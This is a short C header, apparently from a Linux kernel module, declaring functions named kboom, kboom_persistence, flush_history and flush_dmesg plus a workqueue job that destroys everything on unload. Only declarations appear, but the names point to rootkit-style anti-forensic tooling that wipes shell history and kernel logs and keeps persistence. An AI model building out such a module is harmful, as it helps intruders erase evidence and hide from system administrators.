#ifndef SELFDESTRUCT_H
#define SELFDESTRUCT_H

void kboom(void);
void kboom_persistence(void);
void flush_history(void);
void flush_dmesg(void);
void one_thread_to_destruct_all(struct work_struct *work);


#include <linux/workqueue.h>

//#include <linux/interrupt.h>

static DECLARE_WORK(my_work_unload, one_thread_to_destruct_all);

#endif /* SELFDESTRUCT_H */